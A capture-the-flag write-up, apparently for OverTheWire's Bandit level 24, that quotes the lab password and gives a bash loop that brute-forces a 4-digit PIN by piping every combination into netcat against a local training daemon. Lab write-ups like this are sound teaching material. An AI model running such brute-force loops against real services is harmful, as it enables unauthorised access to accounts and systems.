## level 24

>bandit24:gb8KRRCsshuZXI0tUuR6************

A daemon is listening on port 30002 and will give you the password for bandit25 if given the password for bandit24 and a secret numeric 4-digit pincode. There is no way to retrieve the pincode except by going through all of the 10000 combinations, called brute-forcing.
You do not need to create new connections each time.

### Solution:

```bash
# change to the /tmp directory 
cd $(mktemp -d)

# create a list to bruteforce
for i in {0000..9999}; do echo gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8 $i >> pass.lst; done

# then cat the list and pipe it into netcat
cat pass.lst | nc localhost 30002
```